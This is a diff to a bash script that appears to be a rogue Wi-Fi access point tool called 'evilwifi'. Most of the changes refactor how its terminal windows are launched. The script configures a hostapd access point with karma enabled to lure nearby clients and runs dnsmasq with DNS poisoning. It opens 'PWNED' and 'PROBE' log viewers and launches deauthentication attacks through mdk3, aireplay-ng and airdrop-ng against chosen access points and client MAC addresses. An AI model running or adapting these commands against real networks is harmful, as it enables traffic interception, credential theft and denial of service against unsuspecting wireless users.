@@ -46,7 +46,7 @@ echo "
 function setupenv(){
 datestamp=$(date +%F_%I-%M-%S-%p)
 echo "| [ >> ] SETTING UP!";
-REVISION=053
+REVISION=054
 mydistro="`awk '{print $1}' /etc/issue`"
 myversion="`awk '{print $2}' /etc/issue`"
 myrelease="`awk '{print $3}' /etc/issue`"
@@ -58,13 +58,14 @@ initpath=`pwd`
 hostname=$(hostname)
 resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
 folder=/tmp/.evilwifi
+sessionfolder=$folder/$datestamp;
 settings=/etc/evilwifi.conf
 lockfile=$folder/evilwifi.lock
 dhcpconf=/etc/dhcp3/dhcpd.conf
+hostapdconf=$sessionfolder/config/hostapd.conf
 arpaaddr=$(echo $TAPIP|rev)
 # if [ -f $lockfile ]; then echo "$lockfile Detected - Script Halted!"; exit 1; fi
 if [ ! -d $folder ]; then mkdir $folder; fi
-sessionfolder=$folder/$datestamp;
 mkdir $sessionfolder;
 mkdir $sessionfolder/logs;
 mkdir $sessionfolder/pids;
@@ -77,13 +78,13 @@ touch $sessionfolder/config/hostapd.deny;
 touch $sessionfolder/config/hostapd.accept;
 touch $lockfile;
 if [ "$COLORTERM" = "xfce4-terminal" ]; then
-TERM="xfce4-terminal --hide-menubar ";
+TERM="xfce4-terminal --hide-menubar --title \"$TERMTITLE\" ";
 fi
 if [ "$COLORTERM" = "gnome-terminal" ]; then
-TERM="gnome-terminal --hide-menubar ";
+TERM="gnome-terminal --hide-menubar --title \"$TERMTITLE\" ";
 fi
 if [ "$COLORTERM" = "xterm" ]; then
-TERM="xterm +aw +bc +fullscreen -bg black -fg green ";
+TERM="xterm +aw +bc +fullscreen -bg black -fg green -T \"$TERMTITLE\" ";
 fi
 echo "| [$OK] $datestamp";
 }
@@ -161,7 +162,7 @@ monitormodestop
 cleanup
 exit 0;
 }
-trap killscript INT HUP EXIT;
+trap killscript INT HUP;
 ####################
 # INTERNET TESTING #
 ####################
@@ -437,12 +438,10 @@ echo ""
 # CONF FILES SECTION #
 ######################
 function hostapdconfig(){
-hostapdconf=$sessionfolder/config/hostapd.conf
-TAPIFACE=$ATHIFACE
 echo "driver=nl80211" > $hostapdconf
 echo "enable_karma=$karma_enabled" >> $hostapdconf
 echo "karma_black_white=1" >> $hostapdconf
-echo "interface=$TAPIFACE" >> $hostapdconf
+echo "interface=$ATHIFACE" >> $hostapdconf
 echo "logger_syslog=-1" >> $hostapdconf
 echo "logger_syslog_level=2" >> $hostapdconf
 echo "logger_stdout=-1" >> $hostapdconf
@@ -579,9 +578,9 @@ echo "Loading zones"
 fw_zones
 echo "Loading forwardings"
 fw_wan
+if [ "$WANIP" != "" ]; then
 echo "Loading rules"
 fw_rules
-if [ "$WANIP" != "" ]; then
 echo "Loading redirects"
 fw_natreflection
 fi
@@ -835,18 +834,24 @@ function startdnsmasq(){
 echo "no-poll" >> $dnsmasqconf
 echo "no-resolv" >> $dnsmasqconf
 echo "* DNSMASQ DNS POISON!!! *"
-gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
+TERMTITLE="DNSMASQ-POISON"
+$TERM -e \
 "dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
+unset TERMTITLE
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
 echo "* DNSMASQ With Internet *"
-gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
+TERMTITLE="DNSMASQ-INTERNET"
+$TERM -e \
 "dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
+unset TERMTITLE
 }
 function dhcpdserver(){
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
+TERMTITLE="DHCP SERVER"
+$TERM -e \
 "dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
+unset TERMTITLE
 }
 function nodhcpserver(){
 echo "* Not Using A Local DHCP Server *"
@@ -896,13 +901,19 @@ echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
-gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
-gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
-gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
+TERMTITLE="HTTP SERVER"
+$TERM -e "/bin/bash $folder/web.sh"
+unset TERMTITLE
+TERMTITLE="PWNED"
+$TERM -e "/bin/bash $folder/pwned.sh"
+unset TERMTITLE
+TERMTITLE="PROBE"
+$TERM -e "/bin/bash $folder/probe.sh"
+unset TERMTITLE
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
-#gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
+#$TERM -e \
 #"tail -f $sessionfolder/error.log"
 }
 function taillogsairbase(){
@@ -919,13 +930,19 @@ echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
-gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
-gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
-gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
+TERMTITLE="HTTP SERVER"
+$TERM -e "/bin/bash $folder/web.sh"
+unset TERMTITLE
+TERMTITLE="PWNED"
+$TERM -e "/bin/bash $folder/pwned.sh"
+unset TERMTITLE
+TERMTITLE="PROBE"
+$TERM -e "/bin/bash $folder/probe.sh"
+unset TERMTITLE
 #VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
-#gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
+#$TERM -e \
 #"tail -f $sessionfolder/error.log"
 }
 ##########################
@@ -1097,18 +1114,22 @@ echo ""
 read -e -p "Option: " DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
+$TERM -e "mdk3 $MONIFACE d -c $CHAN -w $sessionfolder/logs/whitelist.txt"
 fi
 if [ "$DEAUTHPROG" = "3" ]; then
 DEAUTHPROG=airdrop-ng
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRODUMP-NG" -e \
+TERMTITLE=""
+$TERM -e \
 "airodump-ng --output-format csv --write $sessionfolder/pcap/dump.csv $MONIFACE"
+unset TERMTITLE
 sleep 5
 if [ -f != /usr/sbin/airdrop-ng ]; then
 ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
 fi
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="AIRDROP-NG" -e \
+TERMTITLE=""
+$TERM -e \
 "airdrop-ng -i $MONIFACE -t $sessionfolder/pcap/dump.csv-01.csv -r $sessionfolder/logs/droprules.txt"
+unset TERMTITLE
 fi
 if [ "$DEAUTHPROG" = "2" ]; then
 DEAUTHPROG=aireplay-ng
@@ -1121,18 +1142,18 @@ echo "+===================================+"
 echo ""
 read -e -p "Option: " DEAUTHMODE
 if [ "$DEAUTHMODE" = "1" ]; then
-gnome-terminal -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
+$TERM -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
 if [ "$DEAUTHMODE" = "2" ]; then
 echo ""
 echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
 read -e -p "What Is The APs MAC ADDRESS? " APMAC
-gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"; fi
+$TERM -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"; fi
 if [ "$DEAUTHMODE" = "3" ]; then
 echo ""
 echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
 read -e -p "What Is The APs MAC ADDRESS? " APMAC
 read -e -p "What Is The CLIENTs MAC ADDRESS? " CLIENTMAC
-gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC -c $CLIENTMAC $MONIFACE"; fi
+$TERM -e "aireplay-ng -0 $COUNT -a $APMAC -c $CLIENTMAC $MONIFACE"; fi
 fi
 sleep $COUNT
 killall -q -9 $DEAUTHPROG
@@ -1458,7 +1479,7 @@ echo "# Generated by accesspoint.sh" > /etc/resolv.conf
 echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 fi
 if [ "$softap" = "1" ]; then taillogsairbase; fi
-if [ "$softap" = "2" ]; then taillogshostapd; fi
+# if [ "$softap" = "2" ]; then taillogshostapd; fi
 fw_start
 attackmenu
 if [ "$attack" = "1" ]; then deauth; fi
